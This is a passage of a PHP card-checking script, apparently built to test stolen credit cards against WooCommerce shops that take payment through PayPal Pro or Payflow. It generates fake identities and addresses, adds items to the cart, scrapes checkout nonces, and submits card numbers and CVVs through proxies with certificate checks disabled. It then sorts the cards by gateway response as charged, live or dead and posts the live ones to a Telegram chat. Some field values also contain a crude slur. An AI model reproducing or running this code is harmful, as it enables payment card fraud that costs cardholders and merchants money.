        'zip' => 'B3J 1Y5',
        'state' => 'Nova Scotia',
        'phone' => '(902) 555-4321',
    ],
   ],
   'SG' => [
    [
        'street' => '10 Anson Road',
        'city' => 'Singapore',
        'zip' => '079903',
        'state' => 'Central Region',
        'phone' => '(+65) 6221-1234',
    ],
    [
        'street' => '1 Raffles Place',
        'city' => 'Singapore',
        'zip' => '048616',
        'state' => 'Central Region',
        'phone' => '(+65) 6532-5678',
    ],
    [
        'street' => '101 Thomson Road',
        'city' => 'Singapore',
        'zip' => '307591',
        'state' => 'Central Region',
        'phone' => '(+65) 6253-4567',
    ],
    [
        'street' => '3 Temasek Boulevard',
        'city' => 'Singapore',
        'zip' => '038983',
        'state' => 'Central Region',
        'phone' => '(+65) 6333-7890',
    ],
    [
        'street' => '400 Orchard Road',
        'city' => 'Singapore',
        'zip' => '238875',
        'state' => 'Central Region',
        'phone' => '(+65) 6738-1122',
    ],
   ],
   'TH' => [
    [
        'street' => '123 Sukhumvit Road',
        'city' => 'Bangkok',
        'zip' => '10110',
        'state' => 'Bangkok',
        'phone' => '(+66) 2-123-4567',
    ],
    [
        'street' => '456 Silom Road',
        'city' => 'Bangkok',
        'zip' => '10500',
        'state' => 'Bangkok',
        'phone' => '(+66) 2-234-5678',
    ],
    [
        'street' => '789 Nimmanhemin Road',
        'city' => 'Chiang Mai',
        'zip' => '50200',
        'state' => 'Chiang Mai',
        'phone' => '(+66) 53-345-678',
    ],
    [
        'street' => '12 Ratchadamnoen Road',
        'city' => 'Ayutthaya',
        'zip' => '13000',
        'state' => 'Phra Nakhon Si Ayutthaya',
        'phone' => '(+66) 35-212-345',
    ],
    [
        'street' => '55 Pattaya Beach Road',
        'city' => 'Pattaya',
        'zip' => '20150',
        'state' => 'Chonburi',
        'phone' => '(+66) 38-412-345',
    ],
    ],
    'HK' => [
    [
        'street' => '1 Queen’s Road Central',
        'city' => 'Central',
        'zip' => '',
        'state' => 'Hong Kong Island',
        'phone' => '(+852) 2523-1234',
    ],
    [
        'street' => '88 Gloucester Road',
        'city' => 'Wan Chai',
        'zip' => '',
        'state' => 'Hong Kong Island',
        'phone' => '(+852) 2598-5678',
    ],
    [
        'street' => '15 Salisbury Road',
        'city' => 'Tsim Sha Tsui',
        'zip' => '',
        'state' => 'Kowloon',
        'phone' => '(+852) 2312-3456',
    ],
    [
        'street' => '18 Nathan Road',
        'city' => 'Mong Kok',
        'zip' => '',
        'state' => 'Kowloon',
        'phone' => '(+852) 2384-7890',
    ],
    [
        'street' => '28 Tung Chung Road',
        'city' => 'Lantau Island',
        'zip' => '',
        'state' => 'New Territories',
        'phone' => '(+852) 2985-1234',
    ],
],
'ZA' => [
    [
        'street' => '10 Adderley Street',
        'city' => 'Cape Town',
        'zip' => '8000',
        'state' => 'Western Cape',
        'phone' => '(+27) 21-123-4567',
    ],
    [
        'street' => '150 Rivonia Road',
        'city' => 'Sandton',
        'zip' => '2196',
        'state' => 'Gauteng',
        'phone' => '(+27) 11-234-5678',
    ],
    [
        'street' => '45 Florida Road',
        'city' => 'Durban',
        'zip' => '4001',
        'state' => 'KwaZulu-Natal',
        'phone' => '(+27) 31-345-6789',
    ],
    [
        'street' => '33 Church Street',
        'city' => 'Stellenbosch',
        'zip' => '7600',
        'state' => 'Western Cape',
        'phone' => '(+27) 21-888-1111',
    ],
    [
        'street' => '88 Voortrekker Road',
        'city' => 'Bellville',
        'zip' => '7530',
        'state' => 'Western Cape',
        'phone' => '(+27) 21-555-2222',
    ],
],
    'NL' => [
    [
        'street' => '1 Dam Square',
        'city' => 'Amsterdam',
        'zip' => '1012 JS',
        'state' => 'North Holland',
        'phone' => '(+31) 20-555-1234',
    ],
    [
        'street' => '100 Mauritskade',
        'city' => 'The Hague',
        'zip' => '2599 BR',
        'state' => 'South Holland',
        'phone' => '(+31) 70-789-4567',
    ],
    [
        'street' => '50 Binnenrotte',
        'city' => 'Rotterdam',
        'zip' => '3011 HC',
        'state' => 'South Holland',
        'phone' => '(+31) 10-234-5678',
    ],
    [
        'street' => '10 Grote Markt',
        'city' => 'Groningen',
        'zip' => '9711 LV',
        'state' => 'Groningen',
        'phone' => '(+31) 50-123-4567',
    ],
    [
        'street' => '5 Domplein',
        'city' => 'Utrecht',
        'zip' => '3512 JC',
        'state' => 'Utrecht',
        'phone' => '(+31) 30-555-7890',
    ],
    ],
   'US' => [
    [
        'street' => '1600 Pennsylvania Avenue NW',
        'city' => 'Washington',
        'zip' => '20500',
        'state' => 'DC',
        'phone' => '+1 202-456-1111',
    ],
    [
        'street' => '1 Infinite Loop',
        'city' => 'Cupertino',
        'zip' => '95014',
        'state' => 'CA',
        'phone' => '+1 408-996-1010',
    ],
    [
        'street' => '350 Fifth Avenue',
        'city' => 'New York',
        'zip' => '10118',
        'state' => 'NY',
        'phone' => '+1 212-736-3100',
    ],
    [
        'street' => '221B Baker Street',
        'city' => 'New York',
        'zip' => '10001',
        'state' => 'NY',
        'phone' => '+1 212-555-0101',
    ],
    [
        'street' => '500 S Buena Vista St',
        'city' => 'Burbank',
        'zip' => '91521',
        'state' => 'CA',
        'phone' => '+1 818-560-1000',
    ],
    [
        'street' => '1 Microsoft Way',
        'city' => 'Redmond',
        'zip' => '98052',
        'state' => 'WA',
        'phone' => '+1 425-882-8080',
    ],
    [
        'street' => '160 Spear Street',
        'city' => 'San Francisco',
        'zip' => '94105',
        'state' => 'CA',
        'phone' => '+1 415-555-0199',
    ],
    ],
];

// Determine country based on site domain
if (str_ends_with($site2, '.co.uk')) {
    $country = 'GB';
} elseif (str_ends_with($site2, '.au')) {
    $country = 'AU';
} elseif (str_ends_with($site2, '.ca')) {
    $country = 'CA';
} elseif (str_ends_with($site2, '.co.nz')) {
    $country = 'NZ';
} elseif (str_ends_with($site2, '.jp')) {
    $country = 'JP';
} elseif (str_ends_with($site2, '.ph')) {
    $country = 'PH';
} elseif (str_ends_with($site2, '.my')) {
    $country = 'MY';
} elseif (str_ends_with($site2, '.sg')) {
    $country = 'SG';
} elseif (str_ends_with($site2, '.th')) {
    $country = 'TH';
} elseif (str_ends_with($site2, '.nl')) {
    $country = 'NL';
} elseif (str_ends_with($site2, '.hk')) {
    $country = 'HK';
} elseif (str_ends_with($site2, '.co.za')) {
    $country = 'ZA';
} else {
    $country = 'US';
}

// Select addresses for the country; fallback to US if country not found
if (!isset($addresses[$country])) {
    $country = 'US';
}

// Rotate index (every 10 seconds toggles between 0 and 1)
$index = (int)(time() / 10) % 2;

// Pick the rotating address
$selectedAddress = $addresses[$country][$index];

// Assign to variables
$street = $selectedAddress['street'];
$city = $selectedAddress['city'];
$zip = $selectedAddress['zip'];
$state = $selectedAddress['state'];
$phone = $selectedAddress['phone'];

///---------------------------------------------------------------\\\

// Function to generate a random name
function generateRandomName() {
    $firstNames = ['John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin',
'Isabella', 'Jacob', 'Lily', 'Daniel', 'Mia', 'Alexander', 'Charlotte', 'Samuel', 'Sophia', 'Matthew',
'Amelia', 'David', 'Chloe', 'Luke', 'Ella', 'Henry', 'Grace', 'Andrew', 'Natalie', 'Ethan',
'Harper', 'Jack', 'Scarlett', 'Ryan', 'Abigail', 'Noah', 'Leah', 'Joshua', 'Zoe', 'Caleb',
'Alice', 'Nathan', 'Hannah', 'Isaac', 'Victoria', 'Mason', 'Audrey', 'Elijah', 'Evelyn', 'Dylan',
'Madison', 'Aaron', 'Lucy', 'Thomas', 'Ruby', 'Christopher', 'Penelope', 'George', 'Sadie', 'Logan',
'Ellie', 'Anthony', 'Hazel', 'Samuel', 'Nora', 'Gabriel', 'Aurora', 'Jack', 'Caroline', 'Ryan',
'Stella', 'Owen', 'Riley', 'Julian', 'Sienna', 'Daniel', 'Clara', 'Matthew', 'Leah', 'Oliver',
'Lily', 'Max', 'Violet', 'Aiden', 'Lila', 'Sebastian', 'Daisy', 'Wyatt', 'Clara', 'Leo',
'Madison', 'Finn', 'Eva', 'Jackson', 'Isla', 'Arthur', 'Eliza', 'Charles', 'Amelia', 'Oscar',
'Sophia', 'Victor'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor',
'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin', 'Thompson', 'Garcia', 'Martinez', 'Roberts',
'Walker', 'Perez', 'Young', 'Allen', 'King', 'Wright', 'Scott', 'Green', 'Adams', 'Baker',
'Gonzalez', 'Nelson', 'Carter', 'Mitchell', 'Evans', 'Collins', 'Stewart', 'Sanchez', 'Morales', 'Murphy',
'Cook', 'Rogers', 'Morgan', 'Bell', 'Cooper', 'Reed', 'Bailey', 'Gomez', 'Lambert', 'Parker',
'Watson', 'Brooks', 'Kelly', 'Sanders', 'Price', 'Bennett', 'Wood', 'Barnes', 'Ross', 'Hughes',
'Ward', 'Flores', 'Russell', 'Diaz', 'Ramirez', 'Jenkins', 'Perry', 'Powell', 'Long', 'Foster',
'Grant', 'Harrison', 'Hawkins', 'Curtis', 'Chavez', 'George', 'Simmons', 'Webb', 'Bryant', 'Alexander',
'Johnston', 'Mendoza', 'Bowman', 'Ryan', 'Sullivan', 'Freeman', 'Graham', 'Kim', 'Cameron', 'Simpson',
'Holland', 'Vasquez', 'Patel', 'Morris', 'Robinson', 'Hicks', 'Kimberly', 'Richardson', 'Lynch', 'Chapman',
'Vega', 'Patterson', 'Craig', 'Nichols', 'Gibson', 'Hunter', 'Diaz', 'Harrison', 'Bishop', 'Shaw'];



$numNames = ['345', '562', '754', '128', '934', '287', '619', '480', '731', '296',
 '853', '472', '901', '384', '659', '712', '145', '563', '839', '270',
 '418', '997', '530', '626', '711', '320', '574', '899', '265', '431',
 '801', '347', '154', '987', '672', '390', '528', '743', '615', '204',
 '832', '417', '976', '258', '690', '781', '335', '463', '709', '526',
 '613', '788', '294', '841', '359', '497', '603', '722', '385', '909',
 '547', '824', '395', '681', '757', '312', '430', '680', '549', '893',
 '364', '715', '452', '607', '758', '293', '812', '460', '533', '728',
 '341', '678', '890', '425', '610', '795', '376', '682', '924', '357',
 '489', '620', '739', '263', '569', '405', '631', '750', '171', '213',
 '456', '184', '638', '897', '869', '707', '602', '198', '446', '386',
 '744', '990', '406', '842', '329', '597', '468', '855', '782', '700',
 '356', '983', '290', '438', '550', '741', '192', '888', '311', '920',
 '451', '779', '316', '710', '225', '594', '205', '919', '161', '732',
 '437', '701', '377', '542', '668', '900', '838', '646', '180', '879',
 '811', '699', '544', '388', '511', '488', '777', '598', '883', '109',
 '693', '906', '876', '521', '834', '786', '244', '328', '172', '498',
 '917', '692', '653', '361', '209', '441', '845', '515', '866', '321',
 '271', '652', '478', '604', '729', '666', '327', '408'];

    $numName = $numNames[array_rand($numNames)];
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];

    return [$firstName, $lastName, $numName];
}

// Function to generate a random email domain
function generateRandomEmailDomain() {
    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'edu.ph', 'edu.pl',
'icloud.com', 'zoho.com', 'aol.com', 'protonmail.com', 'hotmail.com',
'mail.com', 'live.com', 'fastmail.com', 'gmx.com', 'mail.ru',
'ymail.com', 'inbox.com', 'tutanota.com', 'yandex.com', 'rocketmail.com',
'lavabit.com', 'comcast.net', 'btinternet.com', 'seznam.cz', 'orange.fr'];
    return $domains[array_rand($domains)];
}

// Function to generate a random email domain
function generateRandomNameDomain() {
    $nems = ['Nora', 'Liam', 'Ava', 'Zane', 'Milo', 'Ivy', 'Ezra', 'Luna', 'Owen', 'Aria',
 'Jude', 'Zoe', 'Noah', 'Maya', 'Leo', 'Ella', 'Kai', 'Nova', 'Beau', 'Nina',
 'Hugo', 'Iris', 'Otis', 'Ruby', 'Eli', 'Lyla', 'Sage', 'Niko', 'Lina', 'Reid',
 'Theo', 'Esme', 'Remy', 'Skye', 'Cleo', 'Zuri', 'Axel', 'Vera', 'Troy', 'Lola',
 'Silas', 'Indie', 'Wren', 'Demi', 'Kian', 'Juno', 'Elio', 'Gia', 'Rory', 'Noa',
 'Mira', 'Hank', 'Nico', 'Dahlia', 'Cruz', 'Eden', 'Kira', 'Poppy', 'Brynn', 'Rowan',
 'Maeve', 'Jasper', 'Calla', 'Alina', 'Koda', 'Freya', 'Lars', 'Talia', 'Reese', 'Tess',
 'Briar', 'Kian', 'Mabel', 'Soren', 'Elsie', 'Dax', 'Anya', 'Finley', 'Opal', 'Jax',
 'Quinn', 'Thea', 'Arlo', 'Isla', 'Gwen', 'Alden', 'Ila', 'Boone', 'Celeste', 'Rhea',
 'Leif', 'Astrid', 'Orin', 'Faye', 'Dane', 'Kaia', 'Shea', 'Ines', 'Maren', 'Flynn',
 'Ione', 'Corin', 'Tamsin', 'Veda', 'Salem', 'Eira', 'Mavis', 'Juno', 'Thorne', 'Liora',
 'Ren', 'Sable', 'Cael', 'Yara', 'Indra', 'Callen', 'Zadie', 'Calix', 'Rumi', 'Petra',
 'Eliora', 'Blaise', 'Nyra', 'Cassian', 'Vaya', 'Amira', 'Torin', 'Nico', 'Fleur', 'Darcy',
 'Lucien', 'Orla', 'Tova', 'Sarai', 'Caius', 'Lira', 'Bo', 'Taryn', 'Adira', 'Caia',
 'Bran', 'Lilith', 'Riven', 'Sorrel', 'Ashby', 'Nysa', 'Thalia', 'Bria', 'Auron', 'Isolde',
 'Keir', 'Senna', 'Ziven', 'Elara', 'Roan', 'Yvaine', 'Arden', 'Nyx', 'Hollis', 'Ori',
 'Fiora', 'Alaric', 'Soren', 'Cleo', 'Vesper', 'Lyra', 'Rowe', 'Junia', 'Evren', 'Tove',
 'Eamon', 'Selene', 'Bryn', 'Cyra', 'Ailis', 'Nesta', 'Myla', 'Caelan', 'Zara', 'Evie',
 'Galen', 'Thorne', 'Ansel', 'Mira', 'Halcyon', 'Sia', 'Dorian', 'Neve', 'Vale', 'Amaris'];
    return $nems[array_rand($nems)];
}


// Generate random name

list($fname, $lname, $numname) = generateRandomName();
$emailDomain = generateRandomEmailDomain();
$email = strtolower($fname . '.' . $lname . '@' . $emailDomain);

$nemsDomain = generateRandomNameDomain();
$username = strtolower($nemsDomain . '_' . $numname);


curl_close($ch);


# -------------------- [ ATC ] --------------- #
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $final_url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
   'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
$ATC = curl_exec($ch);
curl_close($ch);

if ($ATC) {
    $checkoutPattern = '/<a href="([^"]+)" class="button (checkout|btn-checkout) wc-forward">Checkout<\/a>|<a href="([^"]+)">Checkout<\/a>|<form[^>]+action="([^"]+)"[^>]*>/';

    if (preg_match($checkoutPattern, $response, $checkoutMatch)) {

        $checkout1 = $checkoutMatch[1] ?: $checkoutMatch[3] ?: $checkoutMatch[4];
         $checkout1;
    } else {
        $checkout1 = "https://$hostname/checkout";
    }
}

# -------------------- [ CHKOUT  ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $checkout1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);

$Checkout = curl_exec($ch);
curl_close($ch);
$paymentMethods = [
    'paypal_pro' => '/<input[^>]*name="payment_method"[^>]*value="paypal_pro"/',
    'paypalpro' => '/<input[^>]*name="payment_method"[^>]*value="paypalpro"/',
    'wpg_paypal_pro' => '/<input[^>]*name="payment_method"[^>]*value="wpg_paypal_pro"/',
    'wpg_paypal_pro_payflow' => '/<input[^>]*name="payment_method"[^>]*value="wpg_paypal_pro_payflow"/',
    'paypal_pro_payflow' => '/<input[^>]*name="payment_method"[^>]*value="paypal_pro_payflow"/',
    'paypalpropayflow' => '/<input[^>]*name="payment_method"[^>]*value="paypalpropayflow"/'
];

// Initialize an array to store available payment methods found in the response
$availableMethods = [];

// Check for each payment method pattern in the response HTML
foreach ($paymentMethods as $method => $pattern) {
    if (preg_match($pattern, $Checkout)) {
        $availableMethods[] = $method;
    }
}

// Choose the first available payment method based on the response
$selectedPaymentMethod = !empty($availableMethods) ? $availableMethods[0] : null;

// Output the selected payment method based on what was detected in the HTML response
if ($selectedPaymentMethod !== null) {
     "Selected Payment Method for this request: " . $selectedPaymentMethod;
    // Here you can proceed with processing using $selectedPaymentMethod for this specific request
} else {
     "No valid payment method found in the response for this request.";
}
$nonce = trim(strip_tags(getStr($Checkout,'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$patterns = '/<tr class="order-total">.*?<th>Total<\/th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)<\/span>\s*([\d.]+)/s';
if (preg_match($patterns, $Checkout, $matches)) {
    $currency_symbol = $matches[1];
    $amount = $matches[2];
    if ($currency_symbol == '&pound;') {
        $currency_symbol = '£';
    }
}    
  $price1 = $currency_symbol . $amount;



    
# --------------- [ retries ] ----------- #

$retries = 0;

goers:

# ---------------- [ WC AJAX ] --------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=checkout");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.$ua,
    'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'billing_first_name' => $fname,
    'billing_last_name' => $lname,
    'billing_title' => 'TITLE',
    'billing_company' => 'POTANGINAMOCOMPANY',
    'billing_company_type' => 'agency',
    'billing_job_function' => 'public-KOOT',
    'account_password' => $number,
    'billing_country' => $country,
    'billing_address_1' => $street,
    'billing_address_2' => '',
    'billing_city' => $city,
    'billing_state' => $state,
    'billing_postcode' => $zip,
    'billing_phone' => $phone,
    'billing_email' => $email,
    'account_username' => $username,
    'account_password' => $lname,
    'payment_method' => $selectedPaymentMethod,
    'paypal_pro-card-number' => $cc,
    'paypal_pro-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'paypal_pro_card_expiration_month' => $mes1,
    'paypal_pro_card_expiration_year' => $ano_no_20,
    'paypal_pro-card-cvc' => $cvv,
    'billing_credircard' => $cc,
    'billing_expdatemonth' => $mes1,
    'billing_expdateyear' => $ano,
    'billing_cardtype' => $brand,
    'billing_ccvnumber' => $cvv,
    'wpg_paypal_pro-card-number' => $cc,
    'wpg_paypal_pro-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'wpg_paypal_pro-card-cvc' => $cvv,
    'wpg_paypal_pro_payflow-card-number' => $cc,
    'wpg_paypal_pro_payflow-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'wpg_paypal_pro_payflow-card-cvc' => $cvv,
    'paypalpropayflow-card-number' => $cc,
    'paypalpropayflow-card-expiry' => $mes1 . ' / ' . $ano,
    'paypalpropayflow-card-cvc' => $cvv,
    'paypal_pro_payflow-card-cardholder-first' => $fname,
    'paypal_pro_payflow-card-cardholder-last' => $lname,
    'paypal_pro_payflow-card-number' => $cc,
    'paypal_pro_payflow-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'paypal_pro_payflow_card_expiration_month' => $mes1,
    'paypal_pro_payflow_card_expiration_year' => $ano_no_20,
    'paypal_pro_payflow-card_expiration_month' => $mes1,
    'paypal_pro_payflow-card_expiration_year' => $ano_no_20,
    'paypal_pro_payflow-card-cvc' => $cvv,
    'terms' => 'on',
    'terms-field' => 1,
    '_wpnonce' => $nonce,
    '_wp_http_referer' => '/?wc-ajax=update_order_review'
]));


$Payment = curl_exec($ch);
curl_close($ch);

if (empty($Payment)) {
     "Payment data is empty!";
} else {
    $PaymentDecoded = html_entity_decode($Payment, ENT_QUOTES, 'UTF-8');
    $PaymentDecoded = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $PaymentDecoded);
    $decodedPayment = json_decode($PaymentDecoded, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        if (isset($decodedPayment['messages'])) {
            $Respo = strip_tags($decodedPayment['messages']);
            $Respo = preg_replace('/\s+/', ' ', $Respo);
            $Respo = trim($Respo);
            $Respo = htmlentities($Respo, ENT_QUOTES, 'UTF-8');
             "Message: " . $Respo . "<br>";
        } else {
             "The 'messages' field is missing in the payment data.<br>";
        }
        if (isset($decodedPayment['redirect'])) {
            $receipt = $decodedPayment['redirect'];
            $receipt = htmlentities($receipt, ENT_QUOTES, 'UTF-8');
             "Redirect URL: " . $receipt;
        } else {
             "The 'redirect' field is missing in the payment data.";
        }
    } else {
         "Error decoding JSON: " . json_last_error_msg();
    }
}
$linky = trim(strip_tags(getstr($Payment, '"redirect":"','",')));
$orderid = trim(strip_tags(getstr($Payment, '"order_id":','}')));
$decodedResponse = json_decode($Payment, true);

if (isset($decodedResponse['redirect'])) {
    $receipt = $decodedResponse['redirect'];
}
 $receiptUrl = urldecode($receipt);

# ------------ [ UNLINK COOKIE ] ---------- #



function escapeMarkdownV2($text) {
    return str_replace(
        ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'],
        ['\_', '\*', '\[', '\]', '\(', '\)', '\~', '\`', '\>', '\#', '\+', '\-', '\=', '\|', '\{', '\}', '\.', '\!'],
        $text
    );
}

// Escape all variables to avoid MarkdownV2 errors
$escaped_hostname = escapeMarkdownV2($hostname);
$escaped_fname = escapeMarkdownV2($fname);
$escaped_lname = escapeMarkdownV2($lname);
$escaped_street = escapeMarkdownV2($street);
$escaped_city = escapeMarkdownV2($city);
$escaped_state = escapeMarkdownV2($state);
$escaped_zip = escapeMarkdownV2($zip);
$escaped_country = escapeMarkdownV2($country);
$escaped_phone = escapeMarkdownV2($phone);
$escaped_email = escapeMarkdownV2($email);
$escaped_lista = escapeMarkdownV2($lista);

/////////////////////--------BIN INFO------------/////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bins.antipublic.cc/bins/' . $cc6);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

// Updated headers for the new API
$headers = [
    'user-agent: '.$ua,
    'accept: application/json'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
curl_close($ch);

// Decode the JSON response
$binData = json_decode($response, true);

// Initialize variables with defaults
$tite = $cc6;
$cardBrand = 'Not found';
$cardtype = 'Not found';
$cardlevel = 'Not found';
$issuerName = 'Not found';
$isoCountry = 'Not found';

if ($binData && is_array($binData)) {
    // Map JSON keys to your variables
    $tite = $binData['bin'] ?? $cc6;
    $cardBrand = $binData['brand'] ?? 'Not found';
    $cardtype = $binData['type'] ?? 'Not found';
    $cardlevel = $binData['level'] ?? 'Not found';
    $issuerName = $binData['bank'] ?? 'Not found';
    $isoCountry = $binData['country_name'] ?? 'Not found';
}
////////////////////////////////////////////////////////////////////////
# ------------- [ RESPONSES ] ------------------ #

if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
   

         echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [CVV CHARGED][AMOUNT:'.$price1.'] ['.$ip.'] </a> <a href="' . $receiptUrl . '" target="_blank">RECEIPT</a> <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


    // Prepare Telegram message for CVV (Captcha Detected)
    $telegramMessage = "[#CHARGED]-$lista [CVV CHARGED ALLPPRO]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

} elseif (strpos($Payment, "Please enter a valid Credit Card Verification Number.") !== false) {
    
             echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [INVALID CVC] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #d8fd05ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

    
    
    // Prepare Telegram message for CVV (Captcha Detected)
     $telegramMessage = "[#CCN] - $lista [CCN LIVE ALLPPRO]
  
     \n[$hostname1]\n";
     sendToTelegram($telegramMessage, $telegramToken, $chatId);
   
} elseif (strpos($Payment, "CVV2 Mismatch") !== false) {
    
             echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [CVV2 MISMATCH] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #d8fd05ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';



    // Prepare Telegram message for CVV (Captcha Detected)
    $telegramMessage = "[#CCN] - $lista [CVV2 MISMATCH ALLPPRO]
    
    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
  
} elseif (strpos($Payment, "We were unable to process your order, please try again.") !== false) {
 

         echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [MERCHANT ERROR] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


    
} elseif (strpos($Payment, '{"result":"failure","messages":"","refresh":false,"reload":true}') !== false) {
   

     echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [DECLINED] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


} elseif (strpos($Respo, 'Sorry, your session has expired. Return to shop') !== false) {
 
       
             echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [SESSION EXPIRED] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

} elseif (strpos($Respo, 'Payment could not be completed due to a sender account issue. Please notify the user to contact PayPal Customer Support. (Transaction Error) something is wrong.') !== false) {

    
         echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [SENDER ACCOUNT ISSUE SOMETHING IS WRONG] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

 
} elseif (strpos($Respo, 'This transaction cannot be processed. (Transaction Error) something is wrong.') !== false) {  

     echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [THIS TRANSACTION CANNOT BE PROCESSED] [AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
